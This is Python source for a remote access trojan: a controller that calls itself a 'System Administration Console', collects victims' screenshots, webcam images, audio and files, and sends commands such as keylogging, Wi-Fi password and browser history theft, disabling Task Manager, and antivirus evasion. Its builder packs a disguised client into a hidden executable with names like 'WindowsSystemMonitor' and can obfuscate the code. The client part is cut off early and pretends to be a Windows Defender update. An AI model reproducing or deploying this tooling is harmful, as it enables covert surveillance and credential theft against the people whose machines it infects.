import tkinter as tk
from tkinter import messagebox, scrolledtext, filedialog, simpledialog
import socket
import threading
import os
import subprocess
import sys
import tempfile
import shutil
import time
import getpass
import platform
import base64
import random
import webbrowser
import json
import sqlite3
import winreg
from datetime import datetime, timedelta
import ctypes
import requests

class PCRATController:
    def __init__(self, root):
        self.root = root
        self.root.title("System Administration Console")
        self.root.geometry("1200x800")
        self.root.configure(bg="#000000")
        
        self.status_label = None
        
        self.set_icon()
        
        self.server = None
        self.clients = {}
        self.server_running = True
        self.selected_client = None
        self.icon_path = None
        
        self.setup_gui()
        
    def set_icon(self):
        icon_paths = [
            'logo.ico',
            './logo.ico',
            os.path.join(os.path.dirname(__file__), 'logo.ico')
        ]
        
        for icon_path in icon_paths:
            if os.path.exists(icon_path):
                try:
                    self.root.iconbitmap(icon_path)
                    break
                except:
                    continue
    
    def setup_gui(self):
        header_frame = tk.Frame(self.root, bg="#000000")
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(header_frame, text="HOME", command=self.show_home,
                 bg="black", fg="red", font=("Consolas", 12, "bold"),
                 width=12, height=2, relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        tk.Button(header_frame, text="CLIENTS", command=self.show_clients,
                 bg="black", fg="red", font=("Consolas", 12, "bold"),
                 width=12, height=2, relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        tk.Button(header_frame, text="BUILD", command=self.show_build,
                 bg="black", fg="red", font=("Consolas", 12, "bold"),
                 width=12, height=2, relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        tk.Button(header_frame, text="COMMANDS", command=self.show_commands,
                 bg="black", fg="red", font=("Consolas", 12, "bold"),
                 width=12, height=2, relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        self.status_label = tk.Label(header_frame, text="● SERVER: STARTING...", 
                                   bg="black", fg="#00ff00", font=("Consolas", 10, "bold"))
        self.status_label.pack(side=tk.RIGHT, padx=10)
        
        self.content_frame = tk.Frame(self.root, bg="#000000")
        self.content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.show_home()
        
        self.start_server()

    def start_server(self):
        try:
            if hasattr(self, 'server') and self.server:
                try:
                    self.server.close()
                except:
                    pass

            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            ports_to_try = [8080, 8443, 8888, 9000, 9090, 8081, 8082, 8083]
            server_port = None

            for port in ports_to_try:
                try:
                    self.server.bind(('0.0.0.0', port))
                    server_port = port
                    break
                except OSError:
                    continue

            if server_port is None:
                for port in [5555, 5556, 5557, 5558, 5559]:
                    try:
                        self.server.bind(('0.0.0.0', port))
                        server_port = port
                        break
                    except OSError:
                        continue

            if server_port is None:
                raise Exception("No available ports found.")

            self.server.listen(5)
            self.status_label.config(text=f"● SERVER: ONLINE - PORT: {server_port}")
            threading.Thread(target=self.accept_clients, daemon=True).start()

        except Exception as e:
            messagebox.showerror("Server Error", f"Failed to start server: {e}")

    def accept_clients(self):
        while True:
            try:
                client_socket, addr = self.server.accept()
                self.clients[addr] = client_socket
                self.status_label.config(text=f"● SERVER: ONLINE - CLIENTS: {len(self.clients)}")
                threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True).start()
            except:
                break

    def handle_client(self, client_socket, addr):
        while True:
            try:
                raw_data = client_socket.recv(8192)
                if not raw_data:
                    break

                if raw_data.startswith(b"SCREENSHOT_SIZE:"):
                    try:
                        size_info = raw_data.decode('utf-8')
                        screenshot_size = int(size_info.split(":")[1])

                        received_data = b""
                        while len(received_data) < screenshot_size:
                            chunk = client_socket.recv(min(8192, screenshot_size - len(received_data)))
                            if not chunk:
                                break
                            received_data += chunk

                        if len(received_data) == screenshot_size:
                            filename = f"screen_capture_{addr[0]}_{int(time.time())}.png"
                            current_dir = os.path.dirname(os.path.abspath(__file__))
                            filepath = os.path.join(current_dir, filename)

                            with open(filepath, 'wb') as f:
                                f.write(received_data)

                            self.terminal_output.insert(tk.END, f"[{addr[0]}] Screenshot saved: {filepath}\n")
                            self.terminal_output.see(tk.END)
                    except Exception as e:
                        self.terminal_output.insert(tk.END, f"[{addr[0]}] Screenshot error: {e}\n")
                        self.terminal_output.see(tk.END)

                elif raw_data.startswith(b"WEBCAM_SIZE:"):
                    try:
                        size_info = raw_data.decode('utf-8')
                        webcam_size = int(size_info.split(":")[1])

                        received_data = b""
                        while len(received_data) < webcam_size:
                            chunk = client_socket.recv(min(8192, webcam_size - len(received_data)))
                            if not chunk:
                                break
                            received_data += chunk

                        if len(received_data) == webcam_size:
                            filename = f"camera_capture_{addr[0]}_{int(time.time())}.png"
                            current_dir = os.path.dirname(os.path.abspath(__file__))
                            filepath = os.path.join(current_dir, filename)

                            with open(filepath, 'wb') as f:
                                f.write(received_data)

                            self.terminal_output.insert(tk.END, f"[{addr[0]}] Webcam image saved: {filepath}\n")
                            self.terminal_output.see(tk.END)
                    except Exception as e:
                        self.terminal_output.insert(tk.END, f"[{addr[0]}] Webcam error: {e}\n")
                        self.terminal_output.see(tk.END)

                elif b"FILE_START:" in raw_data:
                    try:
                        file_data = raw_data.split(b"FILE_START:")[1].split(b":FILE_END")[0]
                        filename = f"transferred_file_{addr[0]}_{int(time.time())}.dat"
                        current_dir = os.path.dirname(os.path.abspath(__file__))
                        filepath = os.path.join(current_dir, filename)

                        with open(filepath, 'wb') as f:
                            f.write(file_data)

                        self.terminal_output.insert(tk.END, f"[{addr[0]}] File saved: {filepath}\n")
                        self.terminal_output.see(tk.END)
                    except Exception as e:
                        self.terminal_output.insert(tk.END, f"[{addr[0]}] File download error: {e}\n")
                        self.terminal_output.see(tk.END)

                elif b"AUDIO_START:" in raw_data:
                    try:
                        audio_data = raw_data.split(b"AUDIO_START:")[1].split(b":AUDIO_END")[0]
                        filename = f"audio_recording_{addr[0]}_{int(time.time())}.wav"
                        current_dir = os.path.dirname(os.path.abspath(__file__))
                        filepath = os.path.join(current_dir, filename)

                        with open(filepath, 'wb') as f:
                            f.write(audio_data)

                        self.terminal_output.insert(tk.END, f"[{addr[0]}] Audio saved: {filepath}\n")
                        self.terminal_output.see(tk.END)
                    except Exception as e:
                        self.terminal_output.insert(tk.END, f"[{addr[0]}] Audio error: {e}\n")
                        self.terminal_output.see(tk.END)

                else:
                    try:
                        response = raw_data.decode('utf-8')
                        if response:
                            self.terminal_output.insert(tk.END, f"[{addr[0]}] {response}\n")
                            self.terminal_output.see(tk.END)
                    except:
                        if len(raw_data) > 10:
                            self.terminal_output.insert(tk.END, f"[{addr[0]}] Received {len(raw_data)} bytes\n")
                            self.terminal_output.see(tk.END)
            except:
                break

        if addr in self.clients:
            del self.clients[addr]
            self.status_label.config(text=f"● SERVER: ONLINE - CLIENTS: {len(self.clients)}")
            if hasattr(self, 'clients_listbox'):
                self.update_clients_display()
    
    def clear_content(self):
        for widget in self.content_frame.winfo_children():
            widget.destroy()
    
    def show_home(self):
        self.clear_content()
        
        center_frame = tk.Frame(self.content_frame, bg="#000000")
        center_frame.pack(expand=True, pady=50)
        
        logo_loaded = self.load_logo(center_frame)
        
        if not logo_loaded:
            tk.Label(center_frame, text="SYSTEM ADMIN CONSOLE", bg="#000000", fg="red",
                    font=("Consolas", 36, "bold")).pack(pady=50)
        
        tk.Label(center_frame, text="Remote Management Utility", 
                bg="#000000", fg="red", font=("Consolas", 16)).pack(pady=10)
        
        stats_frame = tk.Frame(center_frame, bg="#000000")
        stats_frame.pack(pady=20)
        
        tk.Label(stats_frame, text=f"Connected Systems: {len(self.clients)}", 
                bg="#000000", fg="red", font=("Consolas", 12)).pack()
        tk.Label(stats_frame, text="Service Port: Active", 
                bg="#000000", fg="red", font=("Consolas", 12)).pack()
        
        instructions = """● ADMINISTRATION GUIDE:
1. BUILD - Create management utilities
2. CLIENTS - Monitor connected systems  
3. COMMANDS - Execute remote operations
4. Secure service running"""
        
        tk.Label(center_frame, text=instructions, justify=tk.LEFT,
                bg="#000000", fg="#ff6600", font=("Consolas", 10)).pack(pady=20)
    
    def load_logo(self, parent_frame):
        try:
            try:
                from PIL import Image, ImageTk
            except ImportError:
                return False
                
            logo_paths = [
                'logo.png',
                './logo.png', 
                'logo.jpg',
                './logo.jpg',
                os.path.join(os.path.dirname(__file__), 'logo.png'),
                os.path.join(os.path.dirname(__file__), 'logo.jpg')
            ]
            
            for logo_path in logo_paths:
                if os.path.exists(logo_path):
                    try:
                        logo_img = Image.open(logo_path)
                        logo_img.thumbnail((300, 300), Image.Resampling.LANCZOS)
                        logo_photo = ImageTk.PhotoImage(logo_img)
                        logo_label = tk.Label(parent_frame, image=logo_photo, bg="#000000")
                        logo_label.image = logo_photo
                        logo_label.pack(pady=20)
                        return True
                    except:
                        continue
            return False
        except:
            return False
    
    def show_clients(self):
        self.clear_content()
        
        tk.Label(self.content_frame, text="CONNECTED SYSTEMS", 
                bg="#000000", fg="red", font=("Consolas", 18, "bold")).pack(pady=10)
        
        if not self.clients:
            tk.Label(self.content_frame, text="No systems connected", 
                    bg="#000000", fg="red", font=("Consolas", 14)).pack(pady=50)
            return
        
        list_frame = tk.Frame(self.content_frame, bg="#000000")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        listbox_frame = tk.Frame(list_frame, bg="#000000")
        listbox_frame.pack(fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(listbox_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.clients_listbox = tk.Listbox(listbox_frame, bg="#1a0000", fg="red", 
                                         font=("Consolas", 11), selectbackground="red",
                                         yscrollcommand=scrollbar.set, height=15)
        self.clients_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.clients_listbox.yview)
        
        button_frame = tk.Frame(self.content_frame, bg="#000000")
        button_frame.pack(pady=10)
        
        tk.Button(button_frame, text="REFRESH LIST", command=self.update_clients_display,
                 bg="black", fg="red", font=("Consolas", 10, "bold"),
                 relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        tk.Button(button_frame, text="DISCONNECT SYSTEM", command=self.kick_client,
                 bg="black", fg="red", font=("Consolas", 10, "bold"),
                 relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        tk.Button(button_frame, text="SYSTEM INFO", command=self.get_client_info,
                 bg="black", fg="red", font=("Consolas", 10, "bold"),
                 relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        self.update_clients_display()
    
    def update_clients_display(self):
        if hasattr(self, 'clients_listbox'):
            self.clients_listbox.delete(0, tk.END)
            for addr, client_socket in self.clients.items():
                display_text = f"{addr[0]}:{addr[1]} - {platform.node() if addr[0] == '127.0.0.1' else 'Remote System'}"
                self.clients_listbox.insert(tk.END, display_text)
    
    def show_build(self):
        self.clear_content()
        
        tk.Label(self.content_frame, text="UTILITY BUILDER", 
                bg="#000000", fg="red", font=("Consolas", 18, "bold")).pack(pady=10)
        
        build_frame = tk.Frame(self.content_frame, bg="#000000")
        build_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        ip_frame = tk.Frame(build_frame, bg="#000000")
        ip_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(ip_frame, text="MANAGEMENT SERVER:", bg="#000000", fg="red", 
                font=("Consolas", 12)).pack(side=tk.LEFT)
        
        self.ip_entry = tk.Entry(ip_frame, width=20, bg="#1a0000", fg="red", 
                                font=("Consolas", 12), insertbackground="red", show="*")
        self.ip_entry.pack(side=tk.LEFT, padx=10)
        self.ip_entry.insert(0, "127.0.0.1")
        
        tk.Button(ip_frame, text="SHOW/HIDE", command=self.toggle_ip_visibility,
                 bg="black", fg="red", font=("Consolas", 8, "bold")).pack(side=tk.LEFT, padx=5)
        
        tk.Label(ip_frame, text="PORT: 8080", bg="#000000", fg="red",
                font=("Consolas", 12)).pack(side=tk.LEFT, padx=20)
        
        exe_options_frame = tk.Frame(build_frame, bg="#000000")
        exe_options_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(exe_options_frame, text="APPLICATION ICON:", bg="#000000", fg="red",
                font=("Consolas", 12)).pack(side=tk.LEFT)
        
        self.icon_label = tk.Label(exe_options_frame, text="Default system icon", 
                                  bg="#000000", fg="#ff6600", font=("Consolas", 10))
        self.icon_label.pack(side=tk.LEFT, padx=10)
        
        tk.Button(exe_options_frame, text="SELECT ICON", command=self.browse_icon,
                 bg="black", fg="red", font=("Consolas", 10, "bold"),
                 relief="raised", bd=2).pack(side=tk.LEFT, padx=5)
        
        obfuscation_frame = tk.Frame(build_frame, bg="#000000")
        obfuscation_frame.pack(fill=tk.X, pady=5)
        
        self.obfuscate_var = tk.BooleanVar()
        tk.Checkbutton(obfuscation_frame, text="Code Protection", variable=self.obfuscate_var,
                      bg="#000000", fg="red", selectcolor="black", font=("Consolas", 10)).pack(side=tk.LEFT)
        
        help_text = """● BUILD OPTIONS:
• EXE: Standalone application
• PY: Python utility script
• Auto-recovery features included
• Use localhost for testing"""
        
        help_label = tk.Label(build_frame, text=help_text, justify=tk.LEFT, 
                             bg="#000000", fg="#ff6600", font=("Consolas", 10))
        help_label.pack(pady=10)
        
        button_frame = tk.Frame(build_frame, bg="#000000")
        button_frame.pack(pady=20)
        
        tk.Button(button_frame, text="BUILD EXECUTABLE", command=self.build_exe,
                 bg="black", fg="red", font=("Consolas", 12, "bold"),
                 width=20, height=2, relief="raised", bd=2).pack(side=tk.LEFT, padx=10)
        
        tk.Button(button_frame, text="BUILD SCRIPT", command=self.build_py,
                 bg="black", fg="red", font=("Consolas", 12, "bold"),
                 width=20, height=2, relief="raised", bd=2).pack(side=tk.LEFT, padx=10)
        
        log_frame = tk.Frame(build_frame, bg="#000000")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        tk.Label(log_frame, text="BUILD LOG:", bg="#000000", fg="red",
                font=("Consolas", 12)).pack(anchor=tk.W)
        
        self.build_log = scrolledtext.ScrolledText(log_frame, bg="#1a0000", fg="red",
                                                  font=("Consolas", 9), height=10,
                                                  insertbackground="red")
        self.build_log.pack(fill=tk.BOTH, expand=True)
    
    def toggle_ip_visibility(self):
        if self.ip_entry.cget('show') == '*':
            self.ip_entry.config(show='')
        else:
            self.ip_entry.config(show='*')
    
    def browse_icon(self):
        filename = filedialog.askopenfilename(
            filetypes=[("Icon files", "*.ico"), ("Image files", "*.png *.jpg *.jpeg")]
        )
        if filename:
            self.icon_path = filename
            self.icon_label.config(text=os.path.basename(filename))
    
    def show_commands(self):
        self.clear_content()
        
        tk.Label(self.content_frame, text="COMMAND CONSOLE", 
                bg="#000000", fg="red", font=("Consolas", 18, "bold")).pack(pady=10)
        
        selection_frame = tk.Frame(self.content_frame, bg="#000000")
        selection_frame.pack(fill=tk.X, padx=20, pady=5)
        
        tk.Label(selection_frame, text="SELECTED SYSTEM:", bg="#000000", fg="red",
                font=("Consolas", 11)).pack(side=tk.LEFT)
        
        self.selected_client_label = tk.Label(selection_frame, text="None", 
                                            bg="#000000", fg="#00ff00", font=("Consolas", 11, "bold"))
        self.selected_client_label.pack(side=tk.LEFT, padx=10)
        
        tk.Button(selection_frame, text="CHOOSE SYSTEM", command=self.choose_client_for_commands,
                 bg="black", fg="red", font=("Consolas", 10, "bold"),
                 relief="raised", bd=2).pack(side=tk.LEFT, padx=10)
        
        terminal_control_frame = tk.Frame(self.content_frame, bg="#000000")
        terminal_control_frame.pack(fill=tk.X, padx=20, pady=5)
        
        tk.Button(terminal_control_frame, text="MAXIMIZE CONSOLE", command=self.maximize_terminal,
                 bg="black", fg="red", font=("Consolas", 9, "bold")).pack(side=tk.RIGHT, padx=5)
        
        quick_frame = tk.Frame(self.content_frame, bg="#000000")
        quick_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(quick_frame, text="SYSTEM COMMANDS:", bg="#000000", fg="red",
                font=("Consolas", 12, "bold")).pack(anchor=tk.W)
        
        commands_grid = tk.Frame(quick_frame, bg="#000000")
        commands_grid.pack(fill=tk.X, pady=5)
        
        commands = [
            ("NETWORK INFO", "getip"),
            ("SYSTEM INFO", "sysinfo"),
            ("PROCESS LIST", "tasklist"),
            ("RUNNING APPS", "processes"),
            ("SCREEN CAPTURE", "screenshot"), 
            ("CAMERA CAPTURE", "webcam"),
            ("NETWORK PROFILES", "wifipasswords"),
            ("BROWSER DATA", "browserhistory"),
            ("CLIPBOARD", "clipboard"),
            ("STARTUP ITEMS", "startup"),
            ("FILE LIST", "dir"),
            ("CURRENT PATH", "pwd"),
            ("INPUT MONITOR", "keylogger_start"),
            ("AUDIO RECORD", "mic_record"),
            ("ALL(very good)", "all"),
            ("SYSTEM CONTROLS", "disable_taskmgr"),
            ("SHUTDOWN", "shutdown"),
            ("RESTART", "restart"),
            ("CANCEL SHUTDOWN", "cancel_shutdown"),
            ("FIND FILES", "find"),
            ("NETWORK STATS", "netstat"),
            ("SYSTEM DETAILS", "systeminfo"),
            ("SECURITY TEST", "av_evasion_demo"),
            ("BEHAVIOR TEST", "behavior_evasion")
        ]
        
        for i, (name, cmd) in enumerate(commands):
            row = i // 5
            col = i % 5
            tk.Button(commands_grid, text=name, command=lambda c=cmd: self.send_quick_command(c),
                     bg="black", fg="red", font=("Consolas", 8, "bold"),
                     width=18, height=2, relief="raised", bd=2).grid(row=row, column=col, padx=2, pady=2, sticky="ew")
        
        for i in range(5):
            commands_grid.columnconfigure(i, weight=1)
        
        custom_frame = tk.Frame(self.content_frame, bg="#000000")
        custom_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(custom_frame, text="CUSTOM COMMAND:", bg="#000000", fg="red",
                font=("Consolas", 12, "bold")).pack(anchor=tk.W)
        
        input_frame = tk.Frame(custom_frame, bg="#000000")
        input_frame.pack(fill=tk.X, pady=5)
        
        self.command_entry = tk.Entry(input_frame, bg="#1a0000", fg="red", 
                                     font=("Consolas", 11), insertbackground="red",
                                     width=50)
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.command_entry.bind('<Return>', lambda e: self.send_custom_command())
        
        tk.Button(input_frame, text="EXECUTE", command=self.send_custom_command,
                 bg="black", fg="red", font=("Consolas", 10, "bold"),
                 relief="raised", bd=2).pack(side=tk.RIGHT)
        
        terminal_frame = tk.Frame(self.content_frame, bg="#000000")
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        terminal_header = tk.Frame(terminal_frame, bg="#000000")
        terminal_header.pack(fill=tk.X)
        
        tk.Label(terminal_header, text="OUTPUT:", bg="#000000", fg="red",
                font=("Consolas", 11, "bold")).pack(side=tk.LEFT)
        
        tk.Button(terminal_header, text="CLEAR CONSOLE", command=self.clear_terminal,
                 bg="black", fg="red", font=("Consolas", 9, "bold"),
                 relief="raised", bd=2).pack(side=tk.RIGHT)
        
        self.terminal_output = scrolledtext.ScrolledText(terminal_frame, bg="#1a0000", fg="red",
                                                        font=("Consolas", 10), insertbackground="red")
        self.terminal_output.pack(fill=tk.BOTH, expand=True)
        
        self.terminal_output.tag_configure("link", foreground="blue", underline=True)
        self.terminal_output.bind("<Button-1>", self.check_link_click)
    
    def maximize_terminal(self):
        self.root.state('zoomed')
    
    def check_link_click(self, event):
        index = self.terminal_output.index(f"@{event.x},{event.y}")
        tags = self.terminal_output.tag_names(index)
        
        if "link" in tags:
            for tag in tags:
                if tag.startswith("link_"):
                    url = tag[5:]
                    webbrowser.open(url)
                    break
    
    def add_link_to_terminal(self, text, url):
        self.terminal_output.insert(tk.END, text + " ", "link_" + url)
        self.terminal_output.tag_add("link", "link_" + url + ".first", "link_" + url + ".last")
    
    def clear_terminal(self):
        self.terminal_output.delete(1.0, tk.END)
    
    def choose_client_for_commands(self):
        if not self.clients:
            messagebox.showinfo("No Systems", "No systems connected")
            return
        
        choose_window = tk.Toplevel(self.root)
        choose_window.title("Select System")
        choose_window.geometry("400x300")
        choose_window.configure(bg="#000000")
        
        tk.Label(choose_window, text="Select a system:", bg="#000000", fg="red",
                font=("Consolas", 12)).pack(pady=10)
        
        listbox = tk.Listbox(choose_window, bg="#1a0000", fg="red", font=("Consolas", 11))
        listbox.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        for addr in self.clients.keys():
            listbox.insert(tk.END, f"{addr[0]}:{addr[1]}")
        
        def select():
            selection = listbox.curselection()
            if selection:
                self.selected_client = list(self.clients.keys())[selection[0]]
                self.selected_client_label.config(text=f"{self.selected_client[0]}:{self.selected_client[1]}")
                choose_window.destroy()
                self.terminal_output.insert(tk.END, f"[SYSTEM] Selected: {self.selected_client[0]}\n")
                self.terminal_output.see(tk.END)
        
        tk.Button(choose_window, text="SELECT", command=select,
                 bg="black", fg="red", font=("Consolas", 10, "bold"),
                 relief="raised", bd=2).pack(pady=10)
    
    def send_quick_command(self, command):
        if not self.selected_client:
            messagebox.showwarning("No System", "Please select a system first")
            return
        
        if command in ["find"]:
            filename = simpledialog.askstring("Find File", "Enter filename to search:")
            if filename:
                full_command = f"find {filename}"
                self.send_direct_command(full_command)
            return
        
        try:
            self.clients[self.selected_client].send(command.encode())
            self.terminal_output.insert(tk.END, f"[ADMIN] {command}\n")
            self.terminal_output.see(tk.END)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send command: {e}")
    
    def send_direct_command(self, command):
        try:
            self.clients[self.selected_client].send(command.encode())
            self.terminal_output.insert(tk.END, f"[ADMIN] {command}\n")
            self.terminal_output.see(tk.END)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send command: {e}")
    
    def send_custom_command(self):
        command = self.command_entry.get().strip()
        if not command:
            return
        
        if not self.selected_client:
            messagebox.showwarning("No System", "Please select a system first")
            return
        
        try:
            self.clients[self.selected_client].send(command.encode())
            self.terminal_output.insert(tk.END, f"[ADMIN] {command}\n")
            self.terminal_output.see(tk.END)
            self.command_entry.delete(0, tk.END)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send command: {e}")
    
    def kick_client(self):
        if not hasattr(self, 'clients_listbox'):
            return
            
        selection = self.clients_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a system to disconnect")
            return
        
        client_addr = list(self.clients.keys())[selection[0]]
        
        result = messagebox.askyesno("Warning", 
                                   "This will remove the utility from target system!\n"
                                   "You will lose access permanently.\n"
                                   "Are you sure you want to continue?")
        
        if not result:
            return
        
        try:
            self.clients[client_addr].send(b"self_destruct")
            time.sleep(1)
            self.clients[client_addr].close()
            del self.clients[client_addr]
            
            self.update_clients_display()
            self.status_label.config(text=f"● SERVER: ONLINE - CLIENTS: {len(self.clients)}")
            
            messagebox.showinfo("Success", "System disconnected and utility removed")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to disconnect system: {e}")
    
    def get_client_info(self):
        if not hasattr(self, 'clients_listbox'):
            return
            
        selection = self.clients_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a system")
            return
        
        client_addr = list(self.clients.keys())[selection[0]]
        
        try:
            self.clients[client_addr].send(b"sysinfo")
            messagebox.showinfo("Info Sent", "System info command sent")
        except:
            messagebox.showerror("Error", "Failed to send info command")
    
    def build_exe(self):
        self.build_client("exe")
    
    def build_py(self):
        self.build_client("py")
    
    def build_client(self, build_type):
        server_ip = self.ip_entry.get().strip()
        if not server_ip:
            messagebox.showerror("Error", "Please enter server IP")
            return
        
        client_code = self.get_complete_client_script().replace("{SERVER_IP}", server_ip).replace("{SERVER_PORT}", "8080")
        
        if self.obfuscate_var.get():
            client_code = self.obfuscate_code(client_code)
        
        if hasattr(self, 'build_log'):
            self.build_log.delete(1.0, tk.END)
            self.build_log.insert(tk.END, f"Building {build_type.upper()} utility...\n")
            self.build_log.insert(tk.END, f"Code Protection: {'Enabled' if self.obfuscate_var.get() else 'Disabled'}\n")
            self.build_log.insert(tk.END, f"Auto-recovery: Enabled\n")
            self.build_log.insert(tk.END, f"System integration: Full\n")
            self.build_log.see(tk.END)
        
        try:
            if build_type == "exe":
                self.build_exe_file(client_code)
            else:
                self.build_py_file(client_code)
        except Exception as e:
            if hasattr(self, 'build_log'):
                self.build_log.insert(tk.END, f"Build error: {str(e)}\n")
                self.build_log.see(tk.END)
    
    def obfuscate_code(self, code):
        import re
        import random
        import string
        
        def generate_random_name(length=8):
            return ''.join(random.choices(string.ascii_letters, k=length))
        
        lines = code.split('\n')
        obfuscated = []
        var_mapping = {}
        
        for line in lines:
            func_match = re.match(r'^(\s*def\s+)(\w+)(\s*\()', line)
            if func_match and func_match.group(2) not in ['__init__', '__main__', 'main']:
                func_name = func_match.group(2)
                if func_name not in var_mapping:
                    var_mapping[func_name] = generate_random_name()
            
            var_match = re.match(r'^(\s*)(\w+)(\s*=)', line)
            if var_match and not line.strip().startswith('#'):
                var_name = var_match.group(2)
                if len(var_name) > 2 and var_name not in ['SERVER_IP', 'SERVER_PORT'] and not var_name.isupper():
                    if var_name not in var_mapping:
                        var_mapping[var_name] = generate_random_name()
        
        for line in lines:
            original_line = line
            
            for old_name, new_name in var_mapping.items():
                pattern = r'\b' + re.escape(old_name) + r'\b'
                line = re.sub(pattern, new_name, line)
            
            if line.strip() and not line.strip().startswith('#') and random.random() < 0.1:
                indent = len(line) - len(line.lstrip())
                dummy_comment = ' ' * indent + '# ' + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 20)))
                obfuscated.append(dummy_comment)
            
            obfuscated.append(line)
        
        dummy_imports = [
            'import ' + generate_random_name(),
            generate_random_name() + ' = "' + ''.join(random.choices(string.ascii_letters, k=20)) + '"',
            generate_random_name() + ' = ' + str(random.randint(1000, 9999))
        ]
        
        final_obfuscated = []
        import_section_done = False
        
        for line in obfuscated:
            final_obfuscated.append(line)
            if not import_section_done and line.strip() and not line.startswith('import') and not line.startswith('from'):
                final_obfuscated.extend(dummy_imports)
                import_section_done = True
        
        return '\n'.join(final_obfuscated)
    
    def build_exe_file(self, client_code):
        try:
            import PyInstaller
        except ImportError:
            if hasattr(self, 'build_log'):
                self.build_log.insert(tk.END, "Installing build tools...\n")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        
        temp_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", f"build_{random.randint(1000, 9999)}")
        os.makedirs(temp_dir, exist_ok=True)
        
        client_script_path = os.path.join(temp_dir, "system_utility.py")
        
        with open(client_script_path, 'w', encoding='utf-8') as f:
            f.write(client_code)
        
        executable_names = [
            "WindowsSystemMonitor", "SystemServiceUtility", "UpdateManagerTool", 
            "SecurityScanner", "NetworkHelper", "SystemMaintenance"
        ]
        exe_name = random.choice(executable_names)
        
        cmd = [
            'pyinstaller', 
            '--onefile', 
            '--noconsole', 
            '--name', exe_name,
            '--distpath', temp_dir,
            '--workpath', os.path.join(temp_dir, 'build_cache'),
            '--specpath', temp_dir,
            '--clean',
            '--noconfirm',
            client_script_path
        ]
        
        if self.icon_path and os.path.exists(self.icon_path):
            cmd.extend(['--icon', self.icon_path])
            if hasattr(self, 'build_log'):
                self.build_log.insert(tk.END, f"Using custom icon\n")
        
        if hasattr(self, 'build_log'):
            self.build_log.insert(tk.END, "Building application... This may take a while...\n")
            self.build_log.see(tk.END)
        
        time.sleep(2)
        
        result = subprocess.run(cmd, capture_output=True, text=True, cwd=temp_dir, timeout=300)
        
        if result.returncode == 0:
            dist_dir = os.path.join(temp_dir, 'dist')
            if os.path.exists(dist_dir):
                exe_files = [f for f in os.listdir(dist_dir) if f.endswith('.exe')]
                if exe_files:
                    source_exe = os.path.join(dist_dir, exe_files[0])
                    
                    documents = os.path.join(os.path.expanduser("~"), "Documents")
                    initial_dir = documents
                    
                    target_exe = filedialog.asksaveasfilename(
                        defaultextension=".exe",
                        filetypes=[("Application files", "*.exe")],
                        title="Save System Utility",
                        initialdir=initial_dir,
                        initialfile=f"{exe_name}.exe"
                    )
                    if target_exe:
                        shutil.copy2(source_exe, target_exe)
                        if hasattr(self, 'build_log'):
                            self.build_log.insert(tk.END, f"✓ Application built: {target_exe}\n")
                            self.build_log.insert(tk.END, "✓ Ready for deployment\n")
                        messagebox.showinfo("Success", f"System utility built: {target_exe}")
        else:
            if hasattr(self, 'build_log'):
                self.build_log.insert(tk.END, f"Build completed with warnings\n")
        
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass
    
    def build_py_file(self, client_code):
        documents = os.path.join(os.path.expanduser("~"), "Documents")
        filename = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python files", "*.py"), ("All files", "*.*")],
            title="Save Python Utility",
            initialdir=documents,
            initialfile="system_utility.py"
        )
        if filename:
            time.sleep(1)
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(client_code)
            if hasattr(self, 'build_log'):
                self.build_log.insert(tk.END, f"✓ Python utility saved: {filename}\n")
                self.build_log.insert(tk.END, "✓ Full system integration enabled\n")
            messagebox.showinfo("Success", f"Python utility saved: {filename}")

    def get_complete_client_script(self):
        return """
import socket
import subprocess
import requests
import ctypes
import os
import platform
import sys
import shutil
import time
import tempfile
import io
import json
import getpass
import webbrowser
import sqlite3
import winreg
import base64
import random
import string
import threading

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
from datetime import datetime, timedelta

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
hwnd = kernel32.GetConsoleWindow()
STARTUP_FILENAME = "WindowsDefenderUpdate.py"
REGISTRY_KEY_NAME = "Windows Security Service"
MUTEX_NAME = "Global\\\\WindowsDefenderServiceMutex"
PROCESS_MONITOR_INTERVAL = 5
RESTART_DELAY = 3
RECONNECT_DELAY = 10
MAX_RECONNECT_ATTEMPTS = 1000

def random_name(length=8):
